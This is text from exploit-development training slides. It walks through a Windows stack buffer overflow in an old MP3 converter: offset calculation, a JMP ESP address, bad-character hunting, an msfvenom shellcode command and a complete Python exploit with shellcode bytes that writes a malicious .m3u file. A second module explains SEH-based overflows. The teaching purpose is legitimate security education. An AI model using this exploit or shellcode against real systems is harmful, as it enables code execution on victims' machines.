basic stack overflow exploitation, using Windows XP SP1, 
which is also available in the lab area.
If you are testing the exploits on a different system, like 
Windows XP SP2, keep in mind that most system module 
addresses will be different, and the exploits presented in 
the course are likely to require some patching in order to 
work there.
1.1 Windows Stack Overflow
|  p.10
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
1.2
Windows Basic 
Overflow Analysis
|  p.11
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
In order to present stack overflow exploitation on Windows, 
we will use the ASX to MP3 converter running on Windows 
XP SP1. 
You can download the application from the following link.
https://www.exploit-db.com/apps/f4da5b43ca4b035aae55dfa68daa67c9-
ASXtoMP3Converter.exe
1.2 Windows Basic Overflow Analysis
|  p.12
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
One of the ways this software receives input is by parsing 
.m3u files. The m3u format usually places links to online 
media resources, and it does so one per line. While this 
could be an interesting attack vector, especially for online 
converters, let’s focus on our local example.
Let’s try to overflow the application’s memory by placing 
one lengthy position on the m3u list. For easy creation of 
the m3u files, let’s create a short python script.
1.2.1 Basic Overflow – Crashing the Application
|  p.13
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
This code snippet below writes an “exploit.m3u” file that 
contains the string http://AAA....AAA.
1.2.1 Basic Overflow – Crashing the Application
|  p.14
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Now, let’s run the python script. The “exploit.m3u” file will 
appear. 
We’ll then start the converter software – but do not open 
the m3u file yet. The next step will be attaching the 
debugger to the Converter. 
1.2.1 Basic Overflow – Crashing the Application
|  p.15
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Let’s start the 
Immunity Debugger.
We’ll then go to File 
Attach and find 
the Converter on the 
process list.
1.2.1 Basic Overflow – Crashing the Application
|  p.16
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Upon attaching, the application is in a paused state; this 
means that you are not able to operate on it as the 
debugger prevents it from executing any code. 
Simply press the Run button (or F9) to restore normal 
execution of the application.
1.2.1 Basic Overflow – Crashing the Application
|  p.17
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Finally, let’s drag and 
drop the “exploit.m3u” 
onto the software 
window.
1.2.1 Basic Overflow – Crashing the Application
|  p.18
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
The application hangs, but when we go into the debugger, 
a buffer overflow can be spotted.
1.2.1 Basic Overflow – Crashing the Application
|  p.19
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Since A’s hex representation in ASCII is 0x41, we are sure 
that it was our buffer that overwrote the EIP and made it 
hold a value of 0x41414141 (AAAA). We know that the EIP 
can be controlled, but it’s a long way to code execution.
Let’s start with figuring out how many characters are 
exactly needed to overwrite the EIP.
1.2.1 Basic Overflow – Crashing the Application
|  p.20
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
To do so, you can use the Metasploit pattern_create / 
pattern_offset functionality, but since similar functionality 
is already built into mona.py, let’s use this instead.
Simply type the following in the debugger console.
!mona pattern_create 18000
|  p.21
1.2.2 Basic Overflow – Calculating the Offset
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
You will then receive the output in the debugger window.
1.2.2 Basic Overflow – Calculating the Offset
|  p.22
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
As per the debugger’s warning, the pattern is truncated, and 
it will not be usable if you copy it from this window. Instead, 
it will be present in an unchanged form in the pattern.txt
file, which by default can be located in the Immunity 
Debugger folder:
C:\Program Files\Immunity Inc\Immunity Debugger
1.2.2 Basic Overflow – Calculating the Offset
|  p.23
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Let’s paste the pattern into an exploit. 
We’ll then re-create the m3u file.
1.2.2 Basic Overflow – Calculating the Offset
|  p.24
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
The application should also be restarted. In this case, we 
can do it from the debugger level for convenience. If you 
click the “File” menu, the most recent application will be 
displayed on the bottom. 
Simply click on the Converter or press Ctrl + F2 to restart. 
Remember to Run 
the program after 
that, as it will start 
in a paused state.
1.2.2 Basic Overflow – Calculating the Offset
|  p.25
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
If during the application loading an “Exception” occurs, 
press Shift + F9 to go back to normal startup. Exceptions 
will be explained in a later part of this course.
Drag and drop the newly created exploit m3u file onto the 
converter and check in the debugger what happens.
1.2.2 Basic Overflow – Calculating the Offset
|  p.26
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
We can use mona to retrieve the number of characters that 
caused the program to crash. You can simply re-write the 
EIP value of the command in order to let it calculate the 
offset, as follows.
1.2.2 Basic Overflow – Calculating the Offset
|  p.27
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
The pattern was found after 17417 bytes.
Let’s introduce this amount to the exploit, as follows.
1.2.2 Basic Overflow – Calculating the Offset
|  p.28
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Remember to recreate the exploit file. 
Now, let’s restart the application within the debugger and 
feed it with the latest m3u exploit file.
1.2.2 Basic Overflow – Calculating the Offset
|  p.29
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Perfect! We are overwriting the EIP with “BBBB”. What can 
we do with it though?
1.2.2 Basic Overflow – Calculating the Offset
|  p.30
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
We can specify what the EIP address will be pointing to 
(currently we used the invalid address BBBB). How can we 
specify the address of some code we want to execute?
1.2.3 Basic Overflow – Jumping to the Buffer
|  p.31
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
If we take a look at the stack at address 0x000d5c58, we 
see our buffer consisting of “C” letters. 
Can we use this address instead of B’s and make the 
program execute the C-buffer?
1.2.3 Basic Overflow – Jumping to the Buffer
|  p.32
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Unfortunately, no. 
The address of the stack contains a null byte. As a null byte 
is treated as a string terminator, the application will most 
likely stop to copy anything that occurs past the null. That 
means that the C’s will not be copied and the application 
will start executing some random code that originally 
resided in that place (now it was overwritten with C’s).
1.2.3 Basic Overflow – Jumping to the Buffer
|  p.33
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
However, when observing the registers, it seems that one of 
them, the Stack Pointer (ESP), points to and contains the 
address of our C-buffer. 
The Assembly language offers several instructions that 
might come in handy in such case.
1.2.3 Basic Overflow – Jumping to the Buffer
|  p.34
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
If a register contains a memory address, we can redirect
the execution flow to this address by executing instructions 
like:
• jmp REGISTER
• call REGISTER
• push REGISTER; ret
1.2.3 Basic Overflow – Jumping to the Buffer
|  p.35
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
EXAMPLE
So, for example, if EDX is 0x11223344, and the 
instruction currently executed is jmp EDX, then the 
instruction executed after it will be the one that 
starts at 0x11223344.
|  p.36
1.2.3 Basic Overflow – Jumping to the Buffer
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
In the current case, we have the ESP holding the address of 
a buffer that we control. Thus, if we execute JMP ESP, we 
will start executing the C-buffer!
So, we need to find the address of a “Jump ESP” 
instruction.
Executing the „JMP ESP” will make the program start 
executing the code that is pointed by ESP. In this case, this
is data that we can control.
1.2.3 Basic Overflow – Jumping to the Buffer
|  p.37
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Mona makes it easy for us. Simply type: 
!mona jmp -r ESP
|  p.38
1.2.3 Basic Overflow – Jumping to the Buffer
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
The debugger might freeze for a moment, as the whole 
memory of the process and all its dependent modules are 
searched for suitable instructions. When it finishes, the 
results will be available in a jmp.txt file in the Immunity 
folder, or you can find it via the Immunity menu using View 
-> Log.
1.2.3 Basic Overflow – Jumping to the Buffer
|  p.39
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
You are free to choose any of the modules, as long as the 
jump address does not start with 0. Also, be sure to select 
the “jmp esp” instruction, as an equivalent one might not 
work exactly in the same way.
1.2.3 Basic Overflow – Jumping to the Buffer
|  p.40
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Now, let’s check if this address works. First, let’s add it to 
the exploit, remembering the endianness. Therefore, we 
should write the address in reverse order, as follows.
0x55929d6e = “\x6e\x9d\x92\x55”
1.2.3 Basic Overflow – Jumping to the Buffer
|  p.41
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
If we jump to the C-buffer, we need to find a way to stop the 
execution right after the jump.
„C”, represented as 0x43 in ASCII, also happens to be a 
valid opcode for INC EBX. If we jump to a chain of INC 
EBX’s, they will be executed eventually leading to a crash.
1.2.3 Basic Overflow – Jumping to the Buffer
|  p.42
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
To avoid such an issue after jumping to ESP, let’s put some 
code there that will pause the execution and let us know 
that everything works as intended.
The INT3 (Breakpoint) instruction will be perfect for such a 
purpose. Its opcode is “\xcc”.
1.2.3 Basic Overflow – Jumping to the Buffer
|  p.43
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Let’s insert the breakpoint instruction just before the C-
buffer. We will also regenerate an exploit file and restart the 
application within the debugger.
1.2.3 Basic Overflow – Jumping to the Buffer
|  p.44
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Unfortunately, we did not land in the buffer. The ESP points 
to the C-buffer but not exactly at the beginning. We landed 
somewhere within that buffer.
How can we figure out where are we now?
1.2.3 Basic Overflow – Jumping to the Buffer
|  p.45
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Below are some possible solutions to help us figure out 
where we are:
1. Examine the crash again with pattern_create/offset and 
calculate the offset for what is pointed by the ESP 
(slow).
2. Since there is a lot of space, we can pad the beginning 
of the C-buffer with NOPs before the breakpoint is 
placed. This way, the program will execute NOPs and 
then go straight to the breakpoint. 
1.2.3 Basic Overflow – Jumping to the Buffer
|  p.46
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Choosing option two, let’s modify the exploit. We choose a
NOP number that is big enough to create a safe and large 
NOP slide (50 in this case).
1.2.3 Basic Overflow – Jumping to the Buffer
|  p.47
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
After regenerating the file, restarting the application under 
the debugger and feeding the file to it, we see the following 
in the debugger.
We successfully redirected the execution of the code to the 
location of choice. Let’s see if we can place the shellcode 
now.
1.2.3 Basic Overflow – Jumping to the Buffer
|  p.48
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
During a software crash, you might notice that your 
shellcode, even though it was properly shipped to the 
attacked software, does not work. After further 
investigation, you might also notice that some of the bytes 
sent in the buffer were changed. This is a common 
situation that might be caused by the following factors:
• The copying function treats some non-standard 
characters as a string terminator.
• The target application performs character modification.
1.2.4 Basic Overflow – Bad Characters
|  p.49
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
For example, the underlying code might look like the 
following.
process_user_data(){
tmp = user_input
sanitized_input = sanitize(tmp) //remove all non-printable characters
strcpy(application_memory, sanitized_input)
}
|  p.50
1.2.4 Basic Overflow – Bad Characters
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
In such cases, the memory will be overwritten with a 
different character set than the one supplied in the buffer. 
Depending on which characters are being removed, this will 
make exploitation a bit more difficult. 
Character transformation can be omitted by transforming 
the shellcode in a certain way. Shellcode transformation 
can be achieved manually or automatically. Let’s do it 
automatically this time.
1.2.4 Basic Overflow – Bad Characters
|  p.51
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
When generating shellcode using the msfvenom tool, you 
can use the “-b” parameter to specify bytes that should not 
be used during shellcode generation.
Under the hood, when processing the shellcode, the 
msfvenom generator will use a different instruction set that 
will not contain opcodes corresponding to forbidden bytes. 
As a side effect, you should expect such shellcode to be 
significantly larger. The more characters that have to be 
omitted, the larger the shellcode.
1.2.4 Basic Overflow – Bad Characters
|  p.52
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
There are some well-known bad characters. The majority of text-
processing functions will treat them as string terminators or 
separators, which in turn will cause any part of the buffer past those 
characters to be cut off. Although you might encounter some non-
standard bad characters set, some of the common ones are listed 
below:
•
0x00 – is a common string terminator.
•
0x0a, 0x0d – carriage returns, and line feeds might often be 
treated as line terminators, especially in software that makes use 
of HTTP or FTP protocols.
•
0xff – this byte is often interpreted as EOF (End Of File) .
1.2.4 Basic Overflow – Bad Characters
|  p.53
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
The easiest way to detect bad characters is to put a full 
ASCII table within the buffer and then in the debugger view 
if some of the bytes were removed or altered. 
Often, the presence of a bad character might cause the 
buffer to be truncated. You would then need to change the 
exploit by removing the bad character from the buffer and 
re-send it until all the bad characters are eliminated.
1.2.4.1 Basic Overflow – Detecting Bad Characters
|  p.54
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Let’s implement the ASCII table into the exploit buffer:
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
|  p.55
1.2.4.1 Basic Overflow – Detecting Bad Characters
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
1.2.4.1 Basic Overflow – Detecting Bad Characters
|  p.56
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
After re-creating the exploit file and re-launching the 
application, we again land at the breakpoint in the exploit 
buffer.
1.2.4.1 Basic Overflow – Detecting Bad Characters
|  p.57
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
If we look at the stack view, 
the ASCII buffer is there. 
After all the 90’s, we see a CC 
byte, and then the others – 01, 
02, 03, etc., with the last one 
being 0x08. All others are 
gone. As byte 0x09 is not 
present, we can suspect that it 
might be a bad character. 
1.2.4.1 Basic Overflow – Detecting Bad Characters
|  p.58
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Let’s update the exploit by removing byte 0x09 from the 
ASCII buffer. We’ll then repeat the operation because we 
suspect that this byte is breaking the buffer because:
• The last byte that was not malformed was the byte 
before it.
• This byte itself is malformed.
• All other bytes after it were cut off.
1.2.4.1 Basic Overflow – Detecting Bad Characters
|  p.59
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Unfortunately, this didn’t help. 
There is a possibility that there 
are more bad characters. 
In such a situation, we could 
be forced to verify the exploit 
character by character, which 
can be a very tedious process.
1.2.4.1 Basic Overflow – Detecting Bad Characters
|  p.60
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Despite the logical arguments that pointed to 0x09 being a 
bad character, if the buffer is totally devastated like in this 
particular case, we can first try to identify if there are some 
other common bad character causing this mess.
As you progress with exploiting more software on Windows, 
you will notice that 0x09 rarely causes such problems. 
However, there are other characters in the current buffer 
that do; check out slide 53 to review the list again.
1.2.4.1 Basic Overflow – Detecting Bad Characters
|  p.61
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Since the m3u content is written line by line, and CR LF 
bytes are line terminators, its obvious that they will break 
the exploit (that is meant to reside in a single line). 
Let’s restore 0x09 and remove CRLF, the 0x0a and 0x0d
bytes from the ASCII buffer. Then, we’ll generate a new file,
restart the application, reattach the debugger, and run the 
exploit file.
1.2.4.2 Basic Overflow – Common Bad Characters
|  p.62
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Now that’s what we wanted to see, a full ASCII buffer visible on 
the stack. You can visually examine that no bytes are missing to 
confirm that we identified all bad characters.
|  p.63
1.2.4.2 Basic Overflow – Common Bad Characters
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
The last step will be replacing the breakpoint with real 
shellcode. Let’s generate one using msfvenom. Make sure 
to remember the bad characters.
msfvenom -p windows/exec cmd=calc.exe -b "\x00\x0a\x0d\x20" -f c
|  p.64
1.2.5 Basic Overflow – Implementing Shellcode
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Here is the generated shellcode that was pasted in the 
exploit.
1.2.5 Basic Overflow – Implementing Shellcode
|  p.65
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
After recreating the exploit file, we can see the calculator 
being executed.
1.2.5 Basic Overflow – Implementing Shellcode
|  p.66
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Let’s confirm that everything works correctly by loading 
the exploit .m3u file on the application, without a debugger 
being attached. The calculator will be spawned once 
again. 
The full exploit code can be seen on the next slide. Of 
course, that is the code that generates the.m3u exploit 
file. The file itself has to be opened by the vulnerable 
software in the way shown in the previous slides.
1.2.5 Basic Overflow – Implementing Shellcode
|  p.67
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
buffer = "http://"
shellcode = ("\xda\xd7\xbd\x3e\x3b\xf9\x36\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x31\x31\x68\x18\x03\x68\x18\x83\xc0\x3a\xd9\x0c\xca\xaa\x9f"
"\xef\x33\x2a\xc0\x66\xd6\x1b\xc0\x1d\x92\x0b\xf0\x56\xf6\xa7"
"\x7b\x3a\xe3\x3c\x09\x93\x04\xf5\xa4\xc5\x2b\x06\x94\x36\x2d"
"\x84\xe7\x6a\x8d\xb5\x27\x7f\xcc\xf2\x5a\x72\x9c\xab\x11\x21"
"\x31\xd8\x6c\xfa\xba\x92\x61\x7a\x5e\x62\x83\xab\xf1\xf9\xda"
"\x6b\xf3\x2e\x57\x22\xeb\x33\x52\xfc\x80\x87\x28\xff\x40\xd6"
"\xd1\xac\xac\xd7\x23\xac\xe9\xdf\xdb\xdb\x03\x1c\x61\xdc\xd7"
"\x5f\xbd\x69\xcc\xc7\x36\xc9\x28\xf6\x9b\x8c\xbb\xf4\x50\xda"
"\xe4\x18\x66\x0f\x9f\x24\xe3\xae\x70\xad\xb7\x94\x54\xf6\x6c"
"\xb4\xcd\x52\xc2\xc9\x0e\x3d\xbb\x6f\x44\xd3\xa8\x1d\x07\xb9"
"\x2f\x93\x3d\x8f\x30\xab\x3d\xbf\x58\x9a\xb6\x50\x1e\x23\x1d"
"\x15\xd0\x69\x3c\x3f\x79\x34\xd4\x02\xe4\xc7\x02\x40\x11\x44"
"\xa7\x38\xe6\x54\xc2\x3d\xa2\xd2\x3e\x4f\xbb\xb6\x40\xfc\xbc"
"\x92\x22\x63\x2f\x7e\x8b\x06\xd7\xe5\xd3")
buffer += "A"*17417
buffer += "\x6e\x9d\x92\x55"
buffer += "\x90"*50
buffer += shellcode
buffer += "C"*(600-len(shellcode))
f = open("exploit.m3u", "w")
f.write(buffer)
f.close()
|  p.68
1.2.5 Basic Overflow – Implementing Shellcode
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your members area and 
click the labs drop-down in the appropriate module line or to the virtual labs tabs on the left navigation. To 
upgrade, click LINK. 
In this lab, you will practice 
identifying and exploiting a 
Windows stack overflow 
vulnerability. You will also 
learn how to utilize JMP ESP 
to land in your payload.
Windows Basic Stack 
Overflow
|  p.69
Hera Lab
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
References
|  p.70
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
References
ASX to MP3 Converter 
ASX to MP3 3.1.3.7 - '.m3u' Local Buffer Overflow
https://www.exploit-db.com/apps/f4da5b43ca4b035aae55dfa68daa67c9-
ASXtoMP3Converter.exe
https://www.exploit-db.com/exploits/42974
|  p.71
XDSv1: Section 2, Module 1 - Caendra Inc. © 2019
Labs
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your members area and click the labs drop-down 
in the appropriate module line or to the virtual labs tabs on the left navigation. To upgrade, click LINK. 
Windows Basic Stack Overflow
In this lab, you will practice identifying and exploiting a Windows stack 
overflow vulnerability. You will also learn how to utilize JMP ESP to land 
in your payload.
|  p.72
© Caendra Inc. 2019
All Rights Reserved
Windows SEH Based 
Overflows
S e c t i o n  0 2  |  M o d u l e  0 2
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Table of Contents
MODULE 02 | Windows SEH Based Overflows
2.1 Structured Exception Handling
2.2 SEH Practical Example
|   p.2
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Learning Objectives
By the end of this module, you should have a better 
understanding of:
What a Windows Structured Exception Handler is
How to exploit applications that makes use of SEH
|   p.3
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
2.1
Structured 
Exception Handling
|  p.4
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Structured Exception Handling (SEH) is a Windows feature 
that handles application errors (exceptions). 
It is a mechanism used by programmers that helps
applications handle any unexpected conditions 
encountered during a program’s runtime.
2.1 Structured Exception Handling
|  p.5
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Most programming/scripting languages have similar constructs
for handling exceptions to the one below. Try/except can be 
translated to „Try to do somecode(), and if it throws an error for 
any reason, hide that error and jump to the code in the „except” 
block.
try {
somecode()
} except {
echo “Failed!”
}
|  p.6
2.1 Structured Exception Handling
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
When an exception is caught by Windows, you will be 
presented with the familiar message box stating that the 
“Application encountered an error and will exit”. 
2.1 Structured Exception Handling
|  p.7
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Exception handlers can be programmatically defined using
the following structure.
Typedef struct _EXCEPTION_POINTERS {
PEXCEPTION_RECORD ExceptionRecord;
PCONTEXT ContextRecord;
} EXCEPTION_POINTERS, *PEXCEPTION_POINTERS;
|  p.8
2.1 Structured Exception Handling
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Structured Exception Handlers are implemented in the form 
of a chain, where each Exception Handler record is 8-bytes 
long and consists of two 4-byte addresses stored one after 
another, as follows:
• [Pointer to Next SEH Record] 
• [addr of curent SE Handler]
2.1 Structured Exception Handling
|  p.9
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
The address of the beginning of the SEH chain is held in the 
Thread Information Block (TIB) – a Windows32’ structure 
that is present in every thread, at position FS:[0x00].
Additionally, Immunity debugger has the potential to dump 
the SEH chain in a convenient way. When debugging an 
application use View -> SEH Chain. We will make use of 
this utility later on the course.
2.1 Structured Exception Handling
|  p.10
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Structured Exception Handlers form a linked list, all of 
which resides on the stack near the bottom of it. 
During an exception, Windows first reads the head of the 
list from the TIB, and then tries to walk the subsequent 
handlers, trying to find a suitable one to exit the application 
in a safe manner.
2.1 Structured Exception Handling
|  p.11
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
SEH structures can be the subject of overflows as well as 
any other data on the stack. Can we abuse it?
The exception handler address can be overflowed with a 
custom address, but hardcoding addresses is generally a 
bad practice and will result in very low exploit reliability.
2.1 Structured Exception Handling
|  p.12
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Pre Windows XP SP1, if a crash occurred and the exception 
handler structure was overwritten, a reference to the user’s 
payload could often be found in a register. This is what usually 
happens when a usual buffer overflow is exploited and the user 
can overwrite the EIP with an address of a „JMP REG” instruction, 
where REG points to the user payload.  
However, starting from SP1 onwards, the default behavior of the 
exception handler was altered and now it zeroes all registers 
once a crash occurs. This means, no more payload references in 
the registers during a crash. Another way of exploitation has to 
be used…
2.1 Structured Exception Handling
|  p.13
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
However, we can overflow the exception handler in a way 
that it will reliably execute nearby code, without hardcoding
a stack address.
2.1 Structured Exception Handling
|  p.14
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
During a SEH-based overflow, ESP + 8 holds a reference to 
nSEH (this is universal behavior of SEH). We will see this
shortly in a practical example.
ESP+8 holds the address of nSEH, which means that if we 
can decrease the stack and then execute a return, we will 
be reliably executing whatever code is in nSEH.
2.1 Structured Exception Handling
|  p.15
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Let’s replace the SEH value with an address of a POP POP 
RET gadget (so any instruction following the POP REG, 
POP REG, RET format).
• The first pop will increase the ESP value by 4.
• The second pop will do the same.
• Now the ESP POINTS to nSEH. So, executing a RET 
instruction will redirect the execution flow to the place 
where nSEH is.
2.1 Structured Exception Handling
|  p.16
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
We are executing instructions that are in nSEH. We have 4 
bytes, and then the SEH, which was overwritten with some
address that points to a POP/POP/RET set of instructions.
The bytes that the address in the SEH consists of are rarely 
usable as instructions, so trying to execute them might lead 
to a crash.
2.1 Structured Exception Handling
|  p.17
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
However, there are 4 bytes of the nSEH that will be 
executed. Four bytes are still enough to fit a jump-like
instruction in them.
We can use the nSEH to jump over SEH and start executing 
things that reside past it - like the rest of the user buffer 
which can contain arbitrary data (e.g.- shellcode).
2.1 Structured Exception Handling
|  p.18
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
In x86 Assembly, opcodes for a short jump are EB XX,
where XX is the number of bytes. The short jump’s range is 
constrained by the two-byte range and since there is no 
direction argument, direction is indicated by:
• 0x00 to 0x7f jump forward
• 0x80 – 0xff jump backwards BUT the range is 
reversed
• 0xff jumps -1 byte backwards, and 0x80 jumps -128 
bytes backwards.
2.1 Structured Exception Handling
|  p.19
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
You can read more about short jumps here.
https://thestarman.pcministry.com/asm/2bytejumps.htm
2.1 Structured Exception Handling
|  p.20
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
When we start to execute whatever is in nSEH, and we put
the EB 06 instruction there, which means „Jump 6 bytes 
forward”, then the execution flow will be moved past the 
SEH to the first byte that lies after it.
6 bytes = 2 bytes for EB 06 + (the jump starts here: [2 bytes 
of padding] + [4 bytes of current SEH] )
2.1 Structured Exception Handling
|  p.21
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Of course, this is the most basic example. It might happen 
that there is no place for the shellcode after the SEH. You 
might need to jump backwards more than one time. You 
should also be aware that you might jump over the SEH 
where you have a bit more space, and then perform a long 
jump backwards to execute a larger part of shellcode. 
Exploit development will often require you to be creative.
2.1 Structured Exception Handling
|  p.22
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
2.2
SEH Practical 
Example
|  p.23
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Let’s try to exploit a buffer overflow vulnerability in the 
BigAnt server. We will install it on Windows XP SP1. The 
app can be downloaded from the following location.
https://sites.google.com/site/lupingreycorner/BigAntServe
r_Enu_Setup.zip?attredirects=0
The walkthrough was inspired from the following blog post.
http://www.thegreycorner.com/2010/01/seh-stack-based-
windows-buffer-overflow.html
2.2 SEH Practical Example
|  p.24
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Upon installing, the 
application will ask for some 
first-run settings.
2.2 SEH Practical Example
|  p.25
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
If it asks you for a database, 
leave the default option (MS 
Access) on. 
At the end, click “Try”.
2.2 SEH Practical Example
|  p.26
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Upon starting, you are presented with a console. From it, 
you can check the IP of your server (it should be accessible 
at 127.0.0.1).
2.2 SEH Practical Example
|  p.27
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Also, you might want to know the “Service control” option, 
as you might need to restart the AntServer (port 6600) 
several times during the exploit development process.
2.2 SEH Practical Example
|  p.28
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
If your AntServer is running, you can now launch your 
ImmunityDbg and Attach it to the process. 
2.2.1 SEH Crashing and Debugging
|  p.29
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
You can distinguish the proper process from others via the 
listening port (6600).
Press run (F9) as the application is always in a paused 
state after attaching, and you can start experimenting with 
the application.
2.2.1 SEH Crashing and Debugging
|  p.30
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
The service seems to work incorrectly when re-started. It is 
recommended to work with the application by first restarting it 
from the console level, and then attaching the debugger to it 
each time. This might make the exploit development easier.
We will start with an exploit skeleton. It was already examined 
that the vulnerable command is “USV”, and the command must 
end with a double CRLF. Let’s launch the initial exploit to confirm 
that we can crash the remote service.
2.2.1 SEH Crashing and Debugging
|  p.31
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
The exploit skeleton looks like this.
2.2.1 SEH Crashing and Debugging
|  p.32
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Launching it causes the below access violation.
2.2.1 SEH Crashing and Debugging
|  p.33
